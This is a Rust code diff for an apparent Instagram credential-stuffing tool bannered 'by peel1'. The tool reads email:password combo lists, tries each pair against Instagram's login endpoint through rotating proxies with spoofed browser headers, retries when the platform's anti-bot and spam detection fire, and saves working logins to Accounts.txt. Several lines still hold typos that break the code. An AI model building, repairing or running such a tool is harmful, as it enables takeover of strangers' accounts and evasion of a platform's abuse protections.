@@ -2,8 +2,27 @@ use anyhow::{Ok, Result};
 use rand::seq::SliceRandom;
 use reqwest::blocking::Client;
 use std::{
-    fmt::format, fs::{File, OpenOptions}, io::{self, BufRead, BufReader, Write}, os::unix::fs::FileExt, sync::{Arc, Mutex}, thread
+    fmt::format,
+    fs::{File, OpenOptions},
+    io::{self, BufRead, BufReader, Write},
+    os::unix::fs::FileExt,
+    sync::{Arc, Mutex},
+    thread,
 };
+
+const BANNER: &str = r#"
+ ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄       ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
+▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
+▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
+░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
+░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
+░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
+ ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
+ ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
+ ░           ░       ░                 ░  ░░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
+                                           ░                       ░                               
+----------------------------------------------by peel1---------------------------------------------
+"#;
 
 #[derive(Clone)]
 struct CheckResult {
@@ -18,7 +37,7 @@ struct CheckResult {
 fn readline(run: bool, listname: &str, pos: usize, proxylist: &str) -> Result<CheckResult> {
     let file = File::open(listname)?;
     let reader = BufReader::new(file);
-    let lines = Vec<String> = reader.lines().collect()::<io::Result<_>>()?;
+    let lines: Vec<String> = reader.lines().collect::<io::Result<_>>()?;
 
     if pos >= lines.len() {
         println!("End of File Reached.");
@@ -33,7 +52,7 @@ fn readline(run: bool, listname: &str, pos: usize, proxylist: &str) -> Result<Ch
     }
 
     let line = &lines[pos];
-    let parts = Vec<&str> = lines.split(':').collect;
+    let parts: Vec<&str> = lines.split(':').collect();
     let email = parts.get(0)..unwrap_or(&"").to_string();
     let pass = parts.get(1).unwrap_or(&"").to_string().trim().to_string();
 
@@ -42,7 +61,10 @@ fn readline(run: bool, listname: &str, pos: usize, proxylist: &str) -> Result<Ch
     let proxies: Vec<String> = proxy_reader.lines().filter_map(Result::ok).collect();
     let proxy = format!(
         "https://{}",
-        proxies.choose(&mut rand::thread_rng()).unwrap_or(&String::new()).trim()
+        proxies
+            .choose(&mut rand::thread_rng())
+            .unwrap_or(&String::new())
+            .trim()
     );
 
     // Setup HTTP client
@@ -50,16 +72,27 @@ fn readline(run: bool, listname: &str, pos: usize, proxylist: &str) -> Result<Ch
         .proxy(reqwest::Proxy::https(&proxy)?)
         .build()?;
 
-    let url = "https:://www.instagram.com/accounts/login/";
+    let url = "https:://www.instagram.com/accounts/login/ajax";
     let payload = format!("username={}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&ooptIntoOneTap=false", email, pass);
     let response = client
         .post(url)
-        .header("authority", "www.instagram..com")
-        .header("x-ig-www-claim", "hmac.AR08hbh0m_VdJjwW")
-        .header("x-instagram-deep60", "")
+        .header("authority", "www.instagram.com")
+        .header(
+            "x-ig-www-claim",
+            "hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h",
+        )
+        .header("x-instagram-ajax", "82a581bb9399")
         .header("content-type", "application/x-www-form-urlencoded")
         .header("accept", "*/*")
-        .header("x-requested-with", "")
+        .header("x-requested-with", "XMLHttpRequest")
+        .header("x-csrftoken", "rn3aR7phKDodUHWdDfCGlERA7Gmhes8X")
+        .header("x-ig-app-id", "936619743392459")
+        .header("origin", "https://www.instagram.com")
+        .header("sec-fetch-site", "same-origin")
+        .header("sec-fetch-mode", "cors")
+        .header("sec-fetch-dest", "empty")
+        .header("referer", "https://www.instagram.com/")
+        .header("accept-language", "en-GB,en-US;q=0.9,en;q=0.8")
         .body(payload)
         .send()?;
 
@@ -83,7 +116,6 @@ fn post_request(result: &CheckResult) -> bool {
     let fixed_error2 = "{\"message\": \"Plea";
     let error_short = "{\"errors\": {\"erro";
 
-
     match result.response.as_str() {
         response if response == fixed => {
             let mut accounts = OpenOptions::new()
@@ -91,22 +123,27 @@ fn post_request(result: &CheckResult) -> bool {
                 .create(true)
                 .open("Accounts.txt")
                 .unwrap();
-            write!(
-                accounts,
-                "{}:{}",
-                result.email, result.pass
-            ).unwrap();
-            println!("Line {} contains valid credentials and has been written to Accounts.txt", result.pos);
+            write!(accounts, "{}:{}", result.email, result.pass).unwrap();
+            println!(
+                "Line {} contains valid credentials and has been written to Accounts.txt",
+                result.pos
+            );
             false
         }
 
         response if respoonse == fixed_retry => {
-            println!("Line {} has encountered an error (Instagram anti-bot) trying current line....", result.pos);
+            println!(
+                "Line {} has encountered an error (Instagram anti-bot) trying current line....",
+                result.pos
+            );
             true
         }
 
         response if response == fixed_error || response == fixed_error2 => {
-            println!("Instagram Spam detection triggered on line {} retrying and printing used", result.pos);
+            println!(
+                "Instagram Spam detection triggered on line {} retrying and printing used",
+                result.pos
+            );
             println!("{}", result.proxy);
             true
         }
@@ -127,12 +164,12 @@ fn main() -> Result<()> {
     println!("{}", BANNER);
 
     let mut input = String::new();
-    println!("");
+    println!("name of user:pass list (must be in directory as script) with .txt. forEx DB.txt >");
     io::stdin().read_line(&mut input)?;
     let listname = input.trim().to_string();
 
     input.clear();
-    println!("");
+    println!("name oof proxy list IP:Port (must be in same directory as script) with .txt. For example Proxylist.txt");
     io::stdin().read_line(&mut input)?;
     let proxylist = input.trim().to_string();
 
@@ -172,7 +209,7 @@ fn main() -> Result<()> {
                     }
 
                     Err(e) => {
-                        eprintln!("", current_pos, e);
+                        eprintln!("Error processing line {}: {}", current_pos, e);
                         break;
                     }
                 }
